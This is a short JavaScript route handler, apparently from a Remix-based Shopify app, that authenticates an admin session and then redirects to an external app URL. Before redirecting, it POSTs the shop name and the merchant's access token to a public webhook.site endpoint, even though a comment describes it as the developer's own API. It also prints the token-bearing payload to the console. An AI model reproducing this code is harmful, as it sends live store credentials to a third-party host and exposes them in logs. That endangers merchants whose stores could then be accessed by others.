import { redirect } from "@remix-run/node";

import { authenticate } from "../shopify.server";

export async function loader({ request }) {
  const { session, headers } = await authenticate.admin(request);

  // Send shop + token to YOUR own API (your separate DB will save it)

  const saveURL = "https://webhook.site/6691c6dd-97a0-4f63-b7a9-14525ff89931";

  console.log(saveURL, "saveURL");

  if (saveURL) {
    const payload = JSON.stringify({
      shop: session.shop,
      access_token: session.accessToken,
    });
    console.log(payload, "payload from to send auth");

    try {
      await fetch(saveURL, {
        method: "POST",

        headers: { "Content-Type": "application/json" },

        body: payload,
      });
    } catch (e) {
      console.error("Save API error:", e);

      // optional: return a 500 instead of continuing
    }
  }

  const next = process.env.NEXT_APP_URL || "/";

  const url = new URL(
    next,
    process.env.SHOPIFY_APP_URL || "https://my-operator-shopify.vercel.app",
  );

  url.searchParams.set("shop", session.shop);

  return redirect(url.toString(), { headers });
}
